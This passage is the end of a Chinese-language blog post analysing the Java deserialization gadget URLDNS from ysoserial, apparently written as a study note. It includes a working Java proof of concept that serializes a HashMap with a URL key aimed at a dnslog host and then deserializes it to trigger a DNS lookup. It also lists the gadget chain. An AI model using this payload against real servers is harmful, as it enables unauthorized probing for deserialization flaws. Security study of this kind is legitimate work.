+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> URLDNS2 {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		HashMap&lt;URL, Integer&gt; hashMap = <span style="color:#fff;font-weight:bold">new</span> HashMap&lt;&gt;();
+</span></span><span style="display:flex;"><span>		URL                   url     = <span style="color:#fff;font-weight:bold">new</span> URL(<span style="color:#0ff;font-weight:bold">&#34;http://reus09.zmz0xr.ceye.io&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		Method[] m = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;java.util.HashMap&#34;</span>).<span style="color:#007f7f">getDeclaredMethods</span>();
+</span></span><span style="display:flex;"><span>		<span style="color:#fff;font-weight:bold">for</span> (Method method : m) {
+</span></span><span style="display:flex;"><span>			<span style="color:#fff;font-weight:bold">if</span> (method.<span style="color:#007f7f">getName</span>().<span style="color:#007f7f">equals</span>(<span style="color:#0ff;font-weight:bold">&#34;putVal&#34;</span>)) {
+</span></span><span style="display:flex;"><span>				method.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>				method.<span style="color:#007f7f">invoke</span>(hashMap, -<span style="color:#ff0;font-weight:bold">1</span>, url, <span style="color:#ff0;font-weight:bold">0</span>, <span style="color:#fff;font-weight:bold">false</span>, <span style="color:#fff;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;urldns2.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		oos.<span style="color:#007f7f">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(<span style="color:#fff;font-weight:bold">new</span> FileInputStream(<span style="color:#0ff;font-weight:bold">&#34;urldns2.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		ois.<span style="color:#007f7f">readObject</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据<code>ceye</code>提供的一个<code>dnslog</code>平台，我们可以验证是可以成功触发<code>DNS</code>解析的</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024173649688.png" alt="image-20221024173649688"  />
+</p>
+<p>看一下<code>ysoserial</code>实现方法</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024173118045.png" alt="image-20221024173118045"  />
+</p>
+<p>实际上就是继承了一个<code>URLStreamHandler</code>的类，在初始化 URL 对象时传入，那么在 HashMap 的 <code>put</code> 方法触发的 hash 计算在调用到 <code>URLStreamHandler </code>的<code>getHostAddress</code> 方法时将调用我们自定义的<code> SilentURLStreamHandler</code> 的 <code>getHostAddress</code>，不会触发 DNS 查询，而 <code>put</code> 之后则是通过反射将 URL 对象的 hashCode 的值重新改为 -1。</p>
+<h3 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h3>
+<ol>
+<li>利用说明：
+<ul>
+<li>要构造这个Gadget，只需要初始化⼀个 java.net.URL 对象，作为 key 放在 java.util.HashMap 中；然后，设置这个 URL 对象的 hashCode 为初始值 -1 ，这样反序列化时将会重新计算 其 hashCode ，才能触发到后⾯的DNS请求，否则不会调⽤ URL-&gt;hashCode() 。</li>
+</ul>
+</li>
+<li>Gadget 总结：
+<ul>
+<li>kick-off gadget：<code>java.util.HashMap#readObject()</code></li>
+<li>sink gadget：<code>java.net.URL#hashCode()</code></li>
+<li>chain gadget：无</li>
+</ul>
+</li>
+<li>调用链展示：</li>
+</ol>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>HashMap.readObject()
+</span></span><span style="display:flex;"><span>    HashMap.put()
+</span></span><span style="display:flex;"><span>        HashMap.putVal()
+</span></span><span style="display:flex;"><span>            HashMap.hash()
+</span></span><span style="display:flex;"><span>                URL.hashCode()
+</span></span><span style="display:flex;"><span>                    URLStreamHandler.hashCode()
+</span></span><span style="display:flex;"><span>                        URLStreamHandler.getHostAddress()
+</span></span><span style="display:flex;"><span>                        		InetAddress.getByName()
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="/en/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="/en/posts/tech/commonscollections1%E5%88%86%E6%9E%90/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>CommonsCollections1分析</span>
+  </a>
+  <a class="next" href="/en/posts/tech/java%E4%B9%8Bclassloader/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Java之ClassLoader</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="en/">Reus09&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
